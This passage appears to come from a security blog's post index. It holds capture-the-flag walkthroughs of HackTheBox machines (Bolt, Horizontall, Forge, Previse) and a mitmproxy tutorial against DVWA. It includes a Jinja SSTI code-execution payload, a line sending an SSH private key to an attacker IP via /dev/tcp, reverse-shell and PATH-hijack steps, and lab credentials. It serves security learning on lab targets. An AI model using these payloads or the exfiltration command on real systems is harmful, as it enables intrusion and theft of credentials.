Ltd/stateOrProvinceName=Some-State/countryName=AU| Issuer: commonName=passbolt.bolt.htb/organizationName=Internet Widgits Pty Ltd/stateOrProvinceName=Some-State/countryName=AU| Public Key type: rsa| Public Key bits: 2048| Signature Algorithm: sha256WithRSAEncryption| Not valid before: 2021-02-24T19:11:23| Not valid after:  2022-02-24T19:11:23| MD5:   3ac3 4f7c ee22 88de 7967 fe85 8c42 afc6|_SHA-1: c606 ca92 404f 2f04 6231 68be c4c4 644f e9ed f132Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Fri Oct 22 08:50:21 2021 -- 1 IP address (1 host up) scanned in 50.17 secondsWebThe website presents itself as a large User Interface Kit that will help you prototype and design beautiful, creative and modern websites.Detected web technologies;The footer of the box mentioned the name of the box authors, so this is likely a custom website;Requesting a wrong path in the host returned an interesting title;Bruteforcing the web root with ffuf, I found a few paths;Going to the contact page, I found a web form and two email addresses; support@bolt.htb, and sales@bolt.htb. Using the contact form generated a GET request with no parameters. Checking the source of the form showed that the form is not complete;Checking the pricing page showed an interesting entry;Going to the /download path gave me a link to download a docker image at http://bolt.htb/uploads/image.tarAt the /services page there is a field to submit an email address to “get access to freebies &amp;amp; premium products”. This form also doesn’t do anything.The page at /login provides an authentication form. Manual fuzzing using burp’s repeater didn’t yield anything. But there is an option to register an account on the page;Sending a request to create an account, however, resulted in a 500 Internal Server Error;ffuf previously found two pages /register and sign-up that I assumed are the same pages because their contents looked similar. Both are used to create an account, but while /register gave a 500 HTTP error, /sign-up gave a different response;Changing the request method from POST to GET solved the 500 error, but I was not able to login using the credentials submitted, so this functionality is probably not fully implemented too.Going to the /check-email path discovered earlier, I got this;PassboltNMAP earlier identified a web service on port 443 (HTTPs) with the name passbolt.bolt.htb. Loading the page, it presents itself as an open source password manager;Submitting email addresses in the field gave the error;I found the GitHub repo of the web app at https://github.com/passbolt/passbolt_api. The applications looks pretty solid, so I decided to ignore it.DockerI downloaded the docker image from the site at http://bolt.htb/download. The image is a .tar archive, which is the format used to export docker containers. Using the docker import command, I was able to import the docker image on my local host, but I was unable to run any command on it, saying executable file not found in $PATH for relative paths, or no such file or directory for absolute paths;Since the image is just a .tar archive of the file system of the docker container, I extracted it using the command tar -xvf image.tar and go through the extracted files manually. I found the source code of the web application, and an sqlite database containing the password hash of the user admin@bolt.htb;Feeding the hash to john, I was able to crack it;Giving the email address to the passbolt domain said the email was not associated with any approved user in the domain. But the credential worked on the main bolt.htb domain, and I gained access to the admin dashboard;FootholdMost of the links in the admin dashboard are dead. I did find a few messages exchanged between some Alexander Pierce and Sarah Bullock in which they were talking about a security concern regarding emails;Sarah saying the demo is restricted to invites only made me believe this is the reason I couldn’t create an account on the web application. Going through the source code of the web application extracted from the docker image, the file app/base/routes.py was found to contain the code used to create an account. The code validates account creation requests using the parmater invite_code that must be equal to XNSS-HSJW-3NGU-8XTJ;So I made a request to create an account through Burp Suite and added the invite code, but it still gave me a 500 error. Testing the invite code on the passbolt.bolt.htb domain also didn’t work. This didn’t make much sense, and made me believe the source code I am auditing may actually be for a different service. So I used ffuf to fuzz for hidden subdomains again, and I got 2 hits (the last 3 were due to ffuf bugging out after I hit CTRL + C);Going to the demo page, I got a login form;Although the form looks much like the one on the bolt.htb/login page, I was unable to login using the credential of admin:deadbolt. The site allows for account registration that accepts invite code, and I was able to create an account using the invite code previously obtained. The form required an email address ending with @bolt.htb, and I was able to supply a fake one as the web app does not appear to be validating emails. After logging in, I got a similar dashboard to the previous one, but this one has more features;The page at http://mail.bolt.htb also gave me a login form. Using the credentials of admin:deadbolt, I got an error message that says Connection to storage server failed. Googling this error showed that it happens usually due to configuration errors. Using the test credentials I used to access demo subdomain, I was able to login to the webmail application. This means the web app is creating an email account for every user that signed up on the demo page;Earlier I read some messages exchanged between Alexander Pierce and Sarah Bullock about a security concern regarding emails, so I decided to focus on this webmail. The webmail was identified as RoundCube 1.4.6;I found a couple of links online saying this version of the webmail is vulnerable to XSS. My first thought was to target other users through emails, but I can’t send an email as it keeps giving me an SMTP Error (-1): Connection to server failed.Going back to the demo portal, I have an option to update my profile, which sends a confirmation email to my account in the mail portal with a link to click to confirm changes. So I decided to look at how the functionality is implemented in the extracted source code, and found something very interesting. The way the web application generates the email sent to users to inform them about the changes made could be vulnerable to Server Side Template Injection (SSTI);As can be seen in the image above, the name submitted during profile edit is injected directly into the template in the file templates/emails/update-name.html;Testing the name field using the SSTI payload name{{10*10}}, the web app evaluated the {{10*10}} expression and replaced it with the result, which is 100;Multiple attempts to execute code or read local files kept giving me a 500 Internal server error. Using the {{config.items()}} payload, I obtained some data about the service;Using the payload {{&quot;&quot;.__class__.__mro__[1].__subclasses__()}}, I dumped the accessible classes, and found subprocess.Popen, which can be used to execute system commands;The index of subprocess.Popen in the returned list was found to be 222. This is all the info that is needed to gain code execution on the server. After testing using a local python3 installation, I was able to gain command execution on the host using the payload;{{&quot;&quot;.__class__.__mro__[1].__subclasses__()[222].__call__([&quot;ping&quot;, &quot;-c&quot;, &quot;10&quot;, &quot;10.10.14.95&quot;])}}Directly injection a bash reverse shell kept failing for some reasons, so I just dropped a bash script on the target host using curl, and ran it;UserInside the host as www-data, I found two local users: eddie, and clark. I obtained credentials for the RoundCube and demo web apps in their configration files for the local MySQL server, but nothing of interest was found inside.There is an IMAP service running locally, so I started testing the credentials I obtained in the docker image and the configuration files of the web apps. For the user admin account, I got an internal error;All the other credentials I have at this point did not work for any account. So I kept going through the filesystem in hope of finding new ones, and I did. The file /etc/passbolt/passbolt.php contains a MySQL credential;Using the above credential, I got access to the database passboltdb. Testing for password reuse, I got access to eddie’s account;PrivEscThe user eddie does not have sudo permissions to anything. Enumerating the database used by passbolt, I found the public GPG keys of both eddie and clark, along with a message that was encrypted with the public key of eddie, which means I need his private key to decrypt it;Checking his email file at /var/mail/eddie that I couldn’t access earlier, I saw an interesting message from clark;There is a Google Chrome browser at /opt/chrome, and the SSH server has X11 forwarding enabled. So I launched chrome on the host, and saw a plugin icon for passbolt plugin. Clicking on it launched the plugin, but it stuck like that, saying Connecting to your account.Since clark has told eddie to backup his private key, I assumed the private key is saved somewhere on disk, so I searched the whole filesystem using grep for GPG private key files, and found a match at /home/eddie/.config/google-chrome/Default/Local Extension Settings/didegimhafipceonhjepacocaffmoppf/000003.log. I shipped the file to my attack host for analysis. Going through the file in vim, I was able to extract a private key belonging to eddie.Attempt to import the private key using gpg failed because the key file is password-protected. I tried all the passwords discovered earlier, and none worked. So I used gpg2john to convert the key file to a hash that can be bruteforced by john, and bruteforced it with rockyou.txt. It took a while, but the password was cracked;Using the password, I was able to import the private key file, and decrypt the message;Using the credential highlighted above, I was able to access the account of the root user;Summary  Identified running services using nmap  Found a local installation of Passbolt password manager at https://passbolt.bolt.htb  Enumerated the docker image provided by the site, and found a credential for admin@bolt.htb, which gave me access to the admin dashboard at http://bolt.htb/admin/home  Found an invite code in the source code of http://demo.bolt.htb, which I used to create an account on http://demo.bolt.htb, and gained access to the admin dashboard.          Sigining up on the demo portal auto-creates an account on mail portal.      Exploited an SSTI flaw on mail portal to gain a foothold into the box as www-data.        Inside the box as www-data;          Identified 2 local users; eddie, and clark      Found MySQL credentials used by Passbolt in /etc/passbolt/passbolt.php, which gave me access to the account of eddie, and the user flag.        Inside the box as eddie;          Found an email from clark at /var/mail/eddie, advising eddie to backup his GPG key.      Found a message in the table secrets in the MySQL database used by passbolt. The message was encrypted using eddie’s public key.      Found the private key of eddie inside a log file created by Chrome inside his home directory.      The private key was password protected, so I had to crack it using john.      Finally, I used the cracked private key to decrypt the encrypted message, which was found to contain a password. The password gave access to the root account.      "
  },
  
  {
    "title": "Horizontall - HackTheBox",
    "url": "/posts/hackthebox/horizontall.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, static analysis, cve, rce, tunneling",
    "date": "2022-02-05 00:00:00 +0100",
    
    "snippet": "Horizontall is an easy linux box featuring two RCEs. It has a web service that is generated using some imported JavaScript. Analysing the JavaScript code will lead you to a hidden subdomain, which host a vulnerable web application that you can exploit to gain code execution on the server. Once inside, you will find a Laravel instance running locally, which is also vulnerable to RCE, and will give you access to the box as root.About  OS - Linux  Difficulty - Easy  Points - 20  Release - 28/Aug/2021  IP - 10.10.11.105ReconNmapNmap scan report for 10.10.11.105Host is up (0.26s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)80/tcp open  http    nginx 1.14.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 99.42 secondsHomepage of the web service;Technologies detected by Wappalyzer;The web page contains a few buttons/links, including a contact-us form, none of which do anything.Viewing the source code of the file indicate it’s being dynamically generated using JavaScript, with 2 JavaScript files being imported;The first JS file is pretty large at about 1.2 MB in size. The second one is only 20 KB in size. The JS codes have a mangled syntax, and had to be formatted using js-beautify for easier analysis. About 2 minutes into skimming through the code, I discovered a subdomain on the site;I updated my /etc/hosts file with the new host, and was able to connect;FootholdSearching for one of the web technologies identified by Wappalyzer on the host api-prod.horizontall.htb using searchsploit revealed some interesting flaws;Using the last exploit shown above, I was able achieve blind command-injection on the host;I then used it to spawn a bash reverse shell;A user named developer exists, and I was able to obtain the user flag using the strapi account;The user flag file is the only thing readable to the strapi account inside developer’s home directory, so I continue to explore the system to find something of use. Inside the strapi installation folder in /opt/strapi, I found a JSON file with credentials for the developer user developer:#J!:F9Zt2u;The config seems to be for MySQL server, and netstat showed a MySQL server is running locally, along with some strange service on port 1337;Attempt to login to the developer account via SSH using the credential found failed. I was able to access the backend MySQL server using the above credential, but found nothing of interest.Using curl, the service on port 1337 was identified to be the web app discovered on http://api-prod.horizontall.htb/, while the service on port 8000 was identified as a Laravel installation by downloading the home page using curl on the target host and shipping it to my attack host using netcat.I then created an SSH key file for the strapi user manually because the bash session through netcat is unstable, and shipped the private key to my attack box using the commands;# On attacking machine (a netcat listener to save the file)$ sudo nc -lvp 443 &amp;gt; id_rsa# On target machine in the home of strapi$ ssh-keygen # Create the keys$ cd .ssh/$ cp id_rsa.pub authorized_keys # Enable the key.$ cat id_rsa &amp;gt; /dev/tcp/10.10.14.31/443 # Push it to my box# On attacking machine$ chmod 600 id_rsa # Required by the ssh client$ ssh -i id_rsa strapi@horizontall.htb # Connect using the keyIt worked and I gained SSH access to the box as strapi. Using the SSH access, I set up local port-forwarding from my host on port 8000 to the Laravel service on port 8000 on the target host;PrivEscA quick search found a promising RCE exploit for the version of Laravel running (version 8), but couldn’t use it as it required absolute path of Laravel running on the host, which I didn’t know;I was able to obtain the web root by querying /profiles, a file I read about while reading a post on hacktricks on Laravel debug mode exploitation, on the web app;I was able to get the exploit working on first try using the discovered web root for Laravel;Using my SSH access to strapi user, I downloaded a bash reverse shell from a web service running on my attack host, saved it as /dev/shm/bash_rev.sh, made it executable, and execute it using the Laravel exploit. I took this approach because directly executing the bash reverse shell code using the Laravel exploit kept failing. This gave me root access to the box;Summary  Identified running services using NMAP.  Found a web app that relies heavily on JavaScript to dynamically generate contents, all of which are imported from .js files.  Downloaded the .js files for code analysis, which revealed a hidden virtual host running a web service at api-prod.horizontall.htb          Wappalyzer identified a CMS named strapi, and a search using searchploit revealed an RCE flaw, using which a remote shell was obtained on the host as the user strapi.        Inside the box as the user strapi;          User account with the name developer was identified, and the user flag was obtained from his/her root directory.      Identified a service running locally on port 8000 as Laravel version 8, which is vulnerable to RCE.      Setup a tunnel with SSH, which allowed me to exploit the RCE flaw.      "
  },
  
  {
    "title": "Exploiting Web Applications with MITM Proxy and Elinks",
    "url": "/posts/tutorial/mitmproxy.html",
    "categories": "tutorial",
    "tags": "mitmproxy, mitmweb, elinks, dvwa, web, proxy, command injection",
    "date": "2022-01-25 00:00:00 +0100",
    
    "snippet": "In this little tutorial, I demonstrate how to use mitmproxy and elinks to exploit a vulnerable web app completely from the command line. The target used is DVWA (Damn Vulnerable Web Application), which is running locally in a docker container.The ToolsElinks is a console-based web browser that can be used to browse through websites from the command line. From the manual;  ELinks is a text mode WWW browser, supporting colors, table rendering, background downloading, menu driven configuration interface, tabbed browsing and slim code. Frames are supported. You can have different file formats associated with external viewers. mailto: and telnet: are supported via external clients. ELinks can handle both local files and remote URLs. The main supported remote URL protocols are HTTP, HTTPS (with SSL support compiled in) and FTP. Additional protocol support exists for BitTorrent finger, Gopher, SMB and NNTP. The homepage of ELinks can be found at http://elinks.cz/, where the ELinks manual is also hosted.MITM Proxy is a proxy that you can use from the terminal to inspect, modify, and replay HTTP traffic. Think of it as a console-based Burp Suite alternative. From the official site;  mitmproxy is your swiss-army knife for debugging, testing, privacy measurements, and penetration testing. It can be used to intercept, inspect, modify and replay web traffic such as HTTP/1, HTTP/2, WebSockets, or any other SSL/TLS-protected protocols. You can prettify and decode a variety of message types ranging from HTML to Protobuf, intercept specific messages on-the-fly, modify them before they reach their destination, and replay them to a client or server later on.In this post, I will be using the two tools mentioned to solve a challenge in DVWA.SetupNow that we know the tools we need, let’s get started. You can install ELinks and MITM proxy in debian-based distros (which is what I’m using) with;$ sudo apt install elinks mimtproxyI already have DVWA installed locally in my docker container, and there is a good tutorial here on how to set it up.With DVWA installed, it’s time to test the tools. You can open a URL in elinks using the command;$ elinks &amp;lt;url&amp;gt;In my case, DVWA is installed at http://localhost/dvwa/. Running elinks http://localhost/dvwa load up the login page of DVWA;Using the default credentials of admin:password, I logged in successfully. Elinks is working!Now time to check out MITM proxy. But before we do that, we need to configure Elinks to proxy all HTTP(s) traffic through MITM proxy. A way to do that is by setting the global variables HTTP_PROXY and HTTPS_PROXY with the URL of our MITM proxy. Keeping in mind that MITM proxy by default runs on port 8080, this can be configured using the command;$ export HTTP_PROXY=http://localhost:8080$ export HTTPS_PROXY=http://localhost:8080With that step completed, we can now launch the proxy;$ mitmproxyRestarting Elinks and login into DVWA, you can see that all the requests (referred to as flows in MITM proxy) were routed through the proxy;Scrolling down the POST request used for login (using arrow keys), we could view the contents of the flow by hitting enter, or simply clicking on the flow;(The request)(The response. You can view this by clicking the “Response” tab, or by simply pressing the -&amp;gt; arrow key )To go back to the main menu, press q, which is used to “exit the current view” (you can view all key bindings by pressing ?).The AttackFor this post, I will be exploiting a very easy command injection vulnerability in DVWA. User is provided with an input field to enter an IP address for the web application to ping;If you’ve used the ping utility before, the output above will look very familiar, as it is the one generated by the ping command. We can quickly test this from the console;This indicate the the IP we entered is likely being included in a shell command. This can be tested by going to back to our proxy, and playing around with the request.We can modify the contents of a request in the proxy by pressing e (edit), which will open a small menu asking us what we would like to edit. Since we are targeting a POST parameter, which is in the body of the request, our choice is 2;This will open another window containing the name and values of all the form parameters. Move to the field containing localhost (the value we would like to change) and press enter to start the edit;After you are done, press esc key (to leave edit mode in the field) and then q to go back to the flow menu. As you can see in the below image, the request has been modified successfully;Now we need to send the modified request to the server. To do so, just hit r (replay). A small green circle marker should appear near the URL at the top of the proxy window, which indicate the flow has been replayed. Going to the response tab, we can see that the injected command was executed;Staying FocusedUsing FiltersMITM proxy by default will log every request sent through it and will show it to you in the main menu. This often gets distracting as the requests pile up. A way to solve this is to set up a filter using regular expression so that only flows you are interested in are displayed. Example: In the below image, MITM proxy is showing flows we have 0 interest in;Since we know all URLs for DVWA start with http://localhost/dvwa, we can set up a filter by pressing f, which opens the command prompt of MITM proxy and prefix it with set view filter= (we can manually open the command prompt by typing :), and typing ~u http://localhost/dvwa;Press enter, and watch the filter come to live;It is possible to set the filter to match more than one URL using the logical OR | operator. For example: ~u http://localhost/dvwa|https://google.com will display flows to DVWA, and Google.Note that the ~u in front of the URL is what indicate what the pattern should be matched against. You can view other filter rules by pressing ? and clicking on the Filter Expressions tab (or pressing the -&amp;gt; key). You can match request body, response body, HTTP response code, request headers, and much more!Marking flowsAnother useful feature of mitmproxy that help you focus is the ability to “mark” a flow in the main menu. Just press m while hovering over a flow, and that flow will be marked (or unmaked, depending on it’s state). Notice the red dot in the image below, which indicate a marked flow;After marking flows you are interested in, hit M to make the proxy display only flows that were marked. Press M again to disable this feature.The InterceptsVery often you would want to modify a request after it left a browser, but before it reaches a server. This is called an intercept, and MITM proxy can be used to do this.To intercept a request, you will need to define a scope, which is done using similar expressions used in filtering flows showed in the proxy menu. In the main menu, press i, which will open the command prompt and prefix it with set intercept=. In our example, we can intercept all requests made to DVWA by typing ~u http://localhost/dvwa and pressing enter.With the intercept in place, once we visit a page that matches the given URL, the browser will hang and MITM proxy will present us with the intercepted request, which will be colored red;Clicking on flow, we can do all the modifications we want on it. Let’s change the URL and make it point to a different path. We can do so by pressing e and selecting url in the option;As you can see, after hitting enter, the flow has been successfully modified;To forward this modified request to the server, press a. This will forward the request to the server and obtain a response. Note that the response is also intercepted, which gives you a chance to inspect or modify it. After you are done, hit a again to forward the response back to the browser. You can also kill an intercepted flow by pressing X in the main menu.Sometimes, you are only interested in modifying one intercepted flow, and the number of intercepted flows may start to pile up.  In this case, you can forward all intercepted flows after you are done with your modifications by pressing A in the main menu. You can also quickly enable/disable your configured intercept by pressing I, which will cause an X to appear in the beginning of your intercept rule;PersistenceYou may often need to save the work you have done in MITM proxy so that you can resume from where you stop, or just for record keeping. MITM proxy allows you to save all the listed flows from the main menu by pressing w, and typing the name of the file you want to save the flows as;The above will save the flows as dvwa.flows. Alternatively, you can save an individual flow by opening the flow (by clicking on it) and pressing w, which will prompt you for a filename.To load the saved flows next time you launch the proxy, press L in the main menu, and enter the name of the file containing the flows;BonusResponsible ModificationsWhen modifying a flow in MITM proxy, you should always start by making a copy of it. That way, you have an unmodified copy you can go back to if you messed up the copy you are working on, or just for reference purposes. You can duplicate a flow in the main menu by pressing D while hovering over the flow;To delete a flow you no longer need, just press d while hovering on it. You can also wipe out all flows by pressing z.MITM WebMITM proxy comes with another program, mitmweb, which you can use to start a proxy that you can control through a web browser. To use this, do;$ mitmwebThe above will start a proxy server on port 8080, and the web interface of the proxy on port 8081.  Going to http://localhost:80801, you will be presented with the web UI of MITM proxy;ConclusionMITM proxy is a very nice tool that you can use to easily study and modify web traffic. It has a bit of a learning curve like most tools, but once you get the hang of it, it is quite amazing. The key bindings make most of the tasks a lot less painful. I find myself using it quite often when all I need is a few basic web proxy functionalities."
  },
  
  {
    "title": "Forge - HackTheBox",
    "url": "/posts/hackthebox/forge.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, ssrf, broken access control, ftp, python, pdb, custom exploitation",
    "date": "2022-01-23 00:00:00 +0100",
    
    "snippet": "Forge is a very nice medium linux box featuring a web service that allows for local and remote file upload (via URL). After the upload, user is given a random URL to access the uploaded file. This URL upload functionality has a filter that attempts to block SSRFs, but the filter is flawed, and could be exploited to reach another subdomain on the server that foreign hosts are not allowed to directly access. The vector for privilege escalation is a python script that drops into a pdb shell when user caused an exception.InfoReconNMAP# Nmap 7.70 scan initiated Thu Oct 21 20:28:51 2021 as: nmap -sC -sV -oN nmap.txt -v 10.10.11.111Nmap scan report for forge.htb (10.10.11.111)Host is up (0.23s latency).Not shown: 997 closed portsPORT   STATE    SERVICE VERSION21/tcp filtered ftp22/tcp open     ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)80/tcp open     http    Apache httpd 2.4.41| http-methods: |_  Supported Methods: OPTIONS HEAD GET|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: GalleryService Info: Host: 10.10.11.111; OS: Linux; CPE: cpe:/o:linux:linux_kernelRead data files from: /usr/bin/../share/nmapService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Oct 21 20:29:42 2021 -- 1 IP address (1 host up) scanned in 51.39 secondsWebThere is an image upload functionality at /upload that the homepage links to;Uploading a sample image file saves it to the below location on the server;Clicking the Upload from url in the page above gave me an input field for a URL. Attempts to load a local file using the file:// protocol failed, saying only HTTP and HTTPs protocols are allowed. Entering a URL to my attack host, I got a callback;The python-requests user agent in the header of the request makes me suspect this is some kind of Python WSGI web application. Such applications, from my experience, are an absolute pain to gain command execution through arbitrary file uploads due to the special way they handle paths, so I’m going to ignore this.Bruteforcing the web root with ffuf didn’t yield anything of interest, but bruteforcing for hidden subdomains found one (I had to filter out HTTP redirects as all invalid subdomains result in them);Going to the link, I was told access is only allowed to localhost;Judging from the name of the box, this makes me suspect I need to do some request forgery to fool the web app into thinking I am connecting from localhost. Bruteforcing it’s web root found a directory named static, which is similar to the /static page found on forge.htb, except the latter contains an images directory.My first approach to get around this was to use the image upload functionality on forge.htb/upload. I tried to get web app to send a request to the admin domain, which was blocked;My next step was using special HTTP headers to fool the web app into thinking the request to http://admin.forge.htb came from a different host. It didn’t work. So I performed a full port scan on the host in hope that I missed something that may be used to access this page, like a proxy service. No new port was discovered.FootholdReplacing the subdomain in the URL upload functionality with a random string while keeping the forge.htb hostname resulted in the same URL contains blacklisted address response, which indicate the web app is probably not using it to filter submitted URLs, but rather the hostname. Since hostnames are case-insensitive, I tried to bypass the filter by changing the case of the hostname, and it worked;The web app does not appear to be validating if the contents fetched from the given URL is infact a valid image data, which allowed me to read the HTML code of the admin.forge.htb domain by curling the returned URL;Using the same trick to use the file:// protocol to read local files didn’t work. The above HTML code revealed the path /announcements. Using the URL upload trick above, the file was dumped, and was found to contain some very interesting info, including the credential user:heightofsecurity123!;Attempting to connect to the SSH service using the credential showed the SSH server is likely configured to only allow public key authentication.The contents of the admin.forge.htb/announcement page said it has a file upload function that can be invoked using HTTP request to /upload with the URL passed in the GET parameter u, so tried to use the file:// protocol via this u parameter. The upload returned a success message, but curling the file showed the protocol was blocked, and listed the protocols that are allowed;Testing the FTP protocol by giving it an FTP URL to my attack host (ftp://testuser:testpass@&amp;lt;my-IP&amp;gt;/) with test credentials, tcpdump captured an authentication attempt for the target host;Since NMAP has initially reported an FTP service on the host on port 21 as filtered, I used the credentials of user that was previously obtained to connect to the FTP service running locally on the target. It didn’t work, saying the URL contains a blacklisted address. Using the change of case trick used previously bypassed the filter;Requesting the generated link with curl, I got the contents of the root directory of the FTP service;The presence of the user.txt file indicate the FTP root directory is the home directory of a user. And since the SSH service on the host is blocking password authentication, I’m guessing the user will have public key authentication configured. So I crafted a request for .ssh/id_rsa, which will be the private key file of the user, and it worked;I saved the SSH private key as id_rsa, chmod 600 it, and gained access to the box as user over SSH;PrivEscInside the box as user, I have sudo permission to run a python program;The code of the script;#!/usr/bin/env python3import socketimport randomimport subprocessimport pdbport = random.randint(1025, 65535)try:    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)    sock.bind((&#39;127.0.0.1&#39;, port))    sock.listen(1)    print(f&#39;Listening on localhost:{port}&#39;)    (clientsock, addr) = sock.accept()    clientsock.send(b&#39;Enter the secret passsword: &#39;)    if clientsock.recv(1024).strip().decode() != &#39;secretadminpassword&#39;:        clientsock.send(b&#39;Wrong password!\\n&#39;)    else:        clientsock.send(b&#39;Welcome admin!\\n&#39;)        while True:            clientsock.send(b&#39;\\nWhat do you wanna do: \\n&#39;)            clientsock.send(b&#39;[1] View processes\\n&#39;)            clientsock.send(b&#39;[2] View free memory\\n&#39;)            clientsock.send(b&#39;[3] View listening sockets\\n&#39;)            clientsock.send(b&#39;[4] Quit\\n&#39;)            option = int(clientsock.recv(1024).strip())            if option == 1:                clientsock.send(subprocess.getoutput(&#39;ps aux&#39;).encode())            elif option == 2:                clientsock.send(subprocess.getoutput(&#39;df&#39;).encode())            elif option == 3:                clientsock.send(subprocess.getoutput(&#39;ss -lnt&#39;).encode())            elif option == 4:                clientsock.send(b&#39;Bye\\n&#39;)                breakexcept Exception as e:    print(e)    pdb.post_mortem(e.__traceback__)finally:    quit()Program LogicThe program, when executed, binds to a random port. When a connection is received, it asks for a password, which must be secretadminpassword. If the password is incorrect, the connection is killed. If the password is correct, user is given a bunch of options of the task they wish to perform. This choice is casted to an integer using int(), and the selected action, if valid, is performed. Should an exception occur during all this, the exception will be printed (print(e)), and a pdb (Python Debugger) shell will be spawned in the command prompt that invoked the script.ExploitA pdb shell is a powerful shell that can be used to access all the functionalities of the python interpreter. Since user input is directly casted to an integer, and any error will result in the pdb shell being launched, I was able to exploit this by simply connecting to the listener created by the script from another terminal using the locally installed netcat program, provide the valid password, and give a non-numeric input when asked for the task to perform;Summary  Identified running services using nmap  Found an image upload functionality on the web page that does not validate data, and accepts URL uploads.  Discovered a hidden subdomain admin.forge.htb by fuzzing with ffuf. Access to the domain is only allowed to local hosts.          Exploited the URL upload functionality in the main forge.htb site to access the admin.forge.htb domain.      Dumping the HTML source of the homepage of the admin domain revealed a link to /announcements, which was found to contain an FTP credential for a user named user.      Exploited the URL upload in admin.forge.htb/upload to read the SSH private key of the user over FTP.        Inside the box as user;          user has access to run /opt/remote-manage.py as root using sudo      Exploited the python script to drop into a pdb shell for privesc.      "
  },
  
  {
    "title": "Previse - HackTheBox",
    "url": "/posts/hackthebox/previse.html",
    "categories": "hackthebox",
    "tags": "hackthebox, linux, web, execute after redirect, broken access control, static analysis, command injection, hash cracking, path tampering",
    "date": "2022-01-16 00:00:00 +0100",
    
    "snippet": "Previse is an easy linux box that I really enjoyed. It has an Execute After Redirect (EAR) vulnerability, whereby the application issues a redirect when an unauthenticated user is attempting to access protected pages. However, the contents of the page is still returned in the body of the 302 redirect, but would be hard to notice in a browser as the browser will immediately follow the redirect. Foothold involves exploiting a command injection flaw in the web application, and privilege escalation is via path tampering.Info  OS - Linux  Difficulty - Easy  Points - 20  Release - 07/Aug/2021  IP - 10.10.11.104ReconNmapStarting Nmap 7.70 ( https://nmap.org ) at 2021-09-28 10:39 WATStats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan                                                       SYN Stealth Scan Timing: About 99.99% done; ETC: 10:40 (0:00:00 remaining)                                                            Nmap scan report for 10.10.11.104Host is up (0.26s latency).Not shown: 998 closed portsPORT   STATE SERVICE VERSION22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                     80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                        Nmap done: 1 IP address (1 host up) scanned in 86.13 secondsThe web server provide a login page (PHP);Identified web technologies;Attempts to find the source code of the web app through google searches were unsuccessful.searchsploit showed user enumeration vulns for the version of OpenSSH running;Only the bottom one was runnable during testing, and provides false positives.Further digging discovered a link to a menu that provides some links, most of which are login-protected;I was stucked on this for quite a long time with no idea what to do next as fuzzing for hidden contents and virtual hosts with gobuster and ffuf yielded nothing. Going through captured HTTP traffic in mitmproxy revealed something very weird;When a request was made to /accounts.php (a link I discovered earlier), the web server redirects user to the login page. Most HTTP redirects simply return an emtpy HTML body. However, this one returns the contents of the requested web page, which the browser does not display as it simply follows the redirect instruction. As can be seen in the image above, there is a form for account creation, that was expected to be accessible only to admins. Using the parameters defined in the web form, I was able to craft a POST request to create an account, and gain access to the web application;FootholdHaving gained access to the web application, the next step is to gain a command shell on the host.I found an interesting file in the /files.php page containing possible backup data, and the username of another user newguy;The link to the file is http://previse.htb/download.php?file=32, with the numeric ID being an interesting target for file enumeration. True to it’s name, the file downloaded is a ZIP file containing source code of the web app;The file config.php was found to contain MySQL credentials, which is probably running locally as I can’t access the service from my host;&amp;lt;?phpfunction connectDB(){    $host = &#39;localhost&#39;;    $user = &#39;root&#39;;    $passwd = &#39;mySQL_p@ssw0rd!:)&#39;;    $db = &#39;previse&#39;;    $mycon = new mysqli($host, $user, $passwd, $db);    return $mycon;}?&amp;gt;The username was tested against possible users on the SSH server, but didn’t match any.Using the file upload functionality, I generated a PHP web shell using weevely and upload it to the web app to gain code execution;This did not work as requests to the uploaded file simply result in file download to client with no execution at server side;At this point I decided to analyse the PHP codes involved in file upload and download to figure out a way, if any, to exploit this. Review of /download.php showed the files are stored in the MySQL backend, not disk.I can’t think of any way to exploit this since the file is not stored on disk in the web root. So I continue to analyse other PHP source codes downloaded from the server, and caught a break in the file /logs.php, which is used to download file access logs from the server;Notice in the above code that the POST parameter delim, which is used to specify type of delimiter to use when generating the log output, is injected directly into a shell command, making it vulnerable to Command Injection attacks;I spawned a reverse shell on the host using netcat and bash, and identified a local user named m4lwhere.netstat showed a service running on port 3306 (MySQL)Using the root credentials found earlier in the site’s backup file, I gained access to the previse database, and found the password hash of m4lwhere;The hash captured could not be cracked with the infamous rockyou.txt wordlist using john, so I moved on.Surfing through the file system I made an interesting discovery;This may be helpful when going for root, but I am still working as www-data.Going through the results of john from the previous attempt, I noticed a warning where john identified the hash as more than one type;Since john used md5crypt in the first attempt, I manually selected the other format, and the hash was cracked successfully after taking much longer. Recovered credential: m4lwhere:ilovecody112235!I was then able to connect to the box over SSH, and obtain the user flag;PrivEscThe user m4lwhere can run a custom script as root using sudo;The code of the script;Notice that the script executes the gzip program to create some archives. However, the call to gzip uses relative, not absolute path. When a program is referenced using relative path, the program is searched in the directories defined in the user’s $PATH environment variable, and the first match found is executed. Since I can alter the $PATH variable of the user, the script can be fooled into executing a file with the name gzip that comes before the actual gzip program in the $PATH hierarchy;  The original $PATH  Created a bash reverse shell saved as gzip in /dev/shm  Prefix $PATH with /dev/shm to hijack relative calls to gzipExecuting the script using sudo sent a reverse shell with root privileges to my attack host;Summary  Identified running services using NMAP.  Found a login page at /login.php, and a navigation menu at /nav.php  Noticed that the web app redirects unauthenticated users to the login page when they make a request to an 